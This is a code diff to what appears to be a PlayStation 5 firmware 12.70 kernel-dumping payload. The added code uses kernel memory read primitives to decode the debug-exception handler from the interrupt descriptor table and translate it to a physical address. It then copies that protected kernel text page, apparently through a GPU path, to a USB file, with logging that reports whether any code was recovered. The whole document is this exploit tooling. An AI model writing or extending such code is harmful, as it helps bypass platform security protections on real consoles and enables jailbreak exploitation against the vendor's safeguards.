@@ -20,7 +20,12 @@
 #ifndef TARGET_TEXT_OFFSET
 #define TARGET_TEXT_OFFSET 0ULL
 #endif
-#if TARGET_TEXT_OFFSET == 0ULL
+#ifndef TARGET_DB_HANDLER
+#define TARGET_DB_HANDLER 0
+#endif
+#if TARGET_DB_HANDLER
+#define OUTPUT_PATH "/mnt/usb0/PS5-12.70-ktext-db-handler.bin"
+#elif TARGET_TEXT_OFFSET == 0ULL
 #define OUTPUT_PATH "/mnt/usb0/PS5-12.70-ktext-page0.bin"
 #elif TARGET_TEXT_OFFSET == 0x2A8000ULL
 #define OUTPUT_PATH "/mnt/usb0/PS5-12.70-ktext-pivot-2a8000.bin"
@@ -252,6 +257,7 @@ int main(void)
   uint64_t target_cpu_leaf = 0;
   uint64_t victim_entry_pa = 0, old_leaf = 0;
   int sample_ready = 0;
+  int sample_all_ff = 0;
   uint64_t idt = text + g_sym_map_1270[KERNEL_SYM_IDT_ARRAY];
 
   if ((fw & 0xffff0000U) != FW_1270 || !text ||
@@ -265,6 +271,30 @@ int main(void)
   klog_printf("GVMXOTEXT1270,1,start,fw=0x%08x,text=0x%016" PRIx64
               ",offset=0x%016" PRIx64 "\n", fw, text,
               (uint64_t)TARGET_TEXT_OFFSET);
+
+#if TARGET_DB_HANDLER
+  uint64_t gate_lo = 0, gate_hi = 0;
+  if (read_qword(idt + 0x10, &gate_lo) != 0 ||
+      read_qword(idt + 0x18, &gate_hi) != 0 ||
+      ((gate_lo >> 47) & 1) != 1 ||
+      ((gate_lo >> 40) & 0xf) != 0xe ||
+      ((gate_lo >> 16) & 0xffff) != 0x20) {
+    klog_printf("GVMXOTEXT1270,1,stop,stage=db-gate\n");
+    goto done;
+  }
+  uint64_t handler = (gate_lo & 0xffffULL)
+                   | (((gate_lo >> 48) & 0xffffULL) << 16)
+                   | ((gate_hi & 0xffffffffULL) << 32);
+  if (handler < text || handler >= data) {
+    klog_printf("GVMXOTEXT1270,1,stop,stage=db-handler,va=0x%016" PRIx64 "\n",
+                handler);
+    goto done;
+  }
+  target_va = handler & ~0xfffULL;
+  klog_printf("GVMXOTEXT1270,1,db_handler,va=0x%016" PRIx64
+              ",page=0x%016" PRIx64 ",in_page=0x%03" PRIx64 "\n",
+              handler, target_va, handler & 0xfffULL);
+#endif
 
   if (cpu_translate(dmap, cr3, target_va, &target_pa, &target_cpu_leaf) != 0 ||
       target_pa < 0x1000 || target_pa > MAX_PHYSICAL_PA - COPY_SIZE ||
@@ -460,14 +490,16 @@ done:
     }
   }
   if (sample_ready) {
-    unsigned nonzero = 0, fill = 0;
+    unsigned nonzero = 0, fill = 0, ff = 0;
     for (unsigned i = 0; i < COPY_SIZE; i++) {
       nonzero += sample[i] != 0;
       fill += sample[i] == 0xa5;
+      ff += sample[i] == 0xff;
     }
+    sample_all_ff = ff == COPY_SIZE;
     klog_printf("GVMXOTEXT1270,1,sample,hash=0x%016" PRIx64
-                ",nonzero=%u,a5=%u,first8=%02x%02x%02x%02x%02x%02x%02x%02x\n",
-                hash_page(sample), nonzero, fill,
+                ",nonzero=%u,a5=%u,ff=%u,first8=%02x%02x%02x%02x%02x%02x%02x%02x\n",
+                hash_page(sample), nonzero, fill, ff,
                 sample[0], sample[1], sample[2], sample[3],
                 sample[4], sample[5], sample[6], sample[7]);
   }
@@ -492,14 +524,20 @@ done:
     if (fd < 0 || written != COPY_SIZE || synced != 0 || closed != 0)
       result = 1;
   }
-  klog_printf("GVMXOTEXT1270,1,end,%s\n", result == 0 ? "ok" : "stop");
+  klog_printf("GVMXOTEXT1270,1,end,%s,content=%s\n",
+              result == 0 ? "ok" : "stop",
+              sample_ready ? (sample_all_ff ? "all_ff" : "varied") : "none");
   if (result == 0) {
-    char notice[128];
-    snprintf(notice, sizeof(notice),
-             "12.70 text first 8: %02x %02x %02x %02x %02x %02x %02x %02x",
-             sample[0], sample[1], sample[2], sample[3],
-             sample[4], sample[5], sample[6], sample[7]);
-    notify_result(notice);
+    if (sample_all_ff) {
+      notify_result("12.70 GPU text sample is all FF; no code recovered");
+    } else {
+      char notice[128];
+      snprintf(notice, sizeof(notice),
+               "12.70 text first 8: %02x %02x %02x %02x %02x %02x %02x %02x",
+               sample[0], sample[1], sample[2], sample[3],
+               sample[4], sample[5], sample[6], sample[7]);
+      notify_result(notice);
+    }
   } else {
     notify_result("12.70 GPU text sample stopped; see GVMXOTEXT1270 log");
   }
